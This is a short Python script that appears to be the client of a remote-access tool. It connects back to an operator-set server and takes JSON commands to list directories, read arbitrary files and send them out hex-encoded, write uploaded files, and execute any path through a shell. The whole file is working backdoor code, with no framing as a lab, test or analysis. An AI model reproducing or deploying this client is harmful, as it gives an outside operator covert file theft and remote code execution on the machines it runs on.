import socket
import json
import os
import binascii
import subprocess

def list_dir(path):
    try:
        entries = []
        for item in os.listdir(path):
            full_path = os.path.join(path, item)
            entries.append({
                "name": item,
                "is_dir": os.path.isdir(full_path)
            })
        return {"status": "ok", "entries": entries}
    except Exception as e:
        return {"status": "error", "message": str(e)}

def read_file(path):
    try:
        with open(path, "rb") as f:
            data = f.read()
        return {"status": "ok", "data": binascii.hexlify(data).decode()}
    except Exception as e:
        return {"status": "error", "message": str(e)}

def upload_file(path, hex_data):
    try:
        with open(path, "wb") as f:
            f.write(binascii.unhexlify(hex_data.encode()))
        return {"status": "ok", "message": "File uploaded"}
    except Exception as e:
        return {"status": "error", "message": str(e)}

def exec_file(path):
    try:
        subprocess.Popen(path, shell=True)
        return {"status": "ok", "message": f"Executed {path}"}
    except Exception as e:
        return {"status": "error", "message": str(e)}

def main():
    host = "127.0.0.1"  # Change to your server IP
    port = 9000

    client = socket.socket()
    client.connect((host, port))
    print("[+] Connected to server")

    while True:
        try:
            data = client.recv(10_000_000)
            if not data:
                break
            request = json.loads(data.decode())
            cmd = request.get("command")

            if cmd == "list":
                path = request.get("path")
                response = list_dir(path)
            elif cmd == "read":
                response = read_file(request.get("path"))
            elif cmd == "upload":
                response = upload_file(request.get("path"), request.get("data"))
            elif cmd == "exec":
                response = exec_file(request.get("path"))
            else:
                response = {"status": "error", "message": "Unknown command"}

            client.send(json.dumps(response).encode())
        except Exception as e:
            print("[!] Connection error:", e)
            break

    client.close()

if __name__ == "__main__":
    main()
